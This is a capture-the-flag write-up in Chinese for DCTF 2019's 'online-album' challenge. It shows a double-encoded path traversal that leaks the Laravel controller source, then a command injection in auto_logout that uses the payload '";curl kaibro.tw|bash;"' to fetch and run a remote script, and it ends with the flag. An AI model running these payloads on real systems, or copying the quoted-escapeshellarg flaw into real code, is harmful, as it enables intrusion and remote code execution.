# online-album

觀察可以發現`/download/`處理邏輯怪怪的

例如: `/download/index.php`會噴Source code

fuzzing一波，可以發現`https://online-album.dctfq19.def.camp/download/%252e%252e%252fcomposer.json`

能往上跳，讀其他php source code

讀route `/download/%252e%252e%252froutes/web.php`:

```php
<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
Route::get('/album/{path}', 'HomeController@album')->name('album')->where('path', '.*');
Route::get('/download/{path}', 'HomeController@download')->name('download')->where('path', '.*');
Route::post('/auto-logout', 'HomeController@auto_logout')->name('auto-logout');
```

接著讀HomeController `/download/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/var/www/html/app/Http/Controllers/HomeController.php`:

```php
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Auth;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('home');
    }

    public function album(Request $request, $path)
    {
        // dd($path);
        // dd(getcwd());

        $path = urldecode($path);

        if ($path[0] == "/") {
            $path = substr($str, 1);
        }
        
        $files = scandir($path);
        
        foreach ($files as $key => $file) {
            if ($file[0] == ".") {
                unset($files[$key]);
            }
        }
        // $files = scandir("/var/www/html/");
        $html = "";
        foreach ($files as $photo) {
            $info = pathinfo($photo);
            if(array_key_exists("extension", $info)){
                if ($info["extension"] == "jpeg") {
                $html.="<a target='_blank' href='/download/".$path."/".$photo."'><img width='700' src='/".$path."/".$photo."'></a><hr>";
                }
            }
            
        }
        return view('home', [
            "files" => $files,
            "html" => $html,
        ]);     

    }

    public function download(Request $request, $path)
    {
        // dd($path);
        // dd(getcwd());

        $path = urldecode($path);

        if ($path[0] == "/") {
            $path = substr($str, 1);
        }

        if (strpos($path, "../..")) {
            dd("Ilegal path found!");
        }

        $file = file_get_contents($path);
        return $file;

    }

    public function auto_logout(Request $request)
    {
        Auth::logout();
        //delete file after logout
        $cmd = 'rm "'.storage_path().'/framework/sessions/'.escapeshellarg($request->logut_token).'"';
        shell_exec($cmd);
    }


}
```

可以看到`auto_logout`一臉Command Injection樣

這邊雖然用`escapeshellarg`，但因為他包在雙引號`"`中，所以還是可以Command Injection:

只要`logout_token`塞`";curl kaibro.tw|bash;"`就能RCE

`DCTF{1196df3f624df7a099d4364e96df21a4c7283071177237bdd36e0981da68bd29}`

![](https://github.com/w181496/CTF/blob/master/dctf2019-qual/onlinealbum/flag.png)
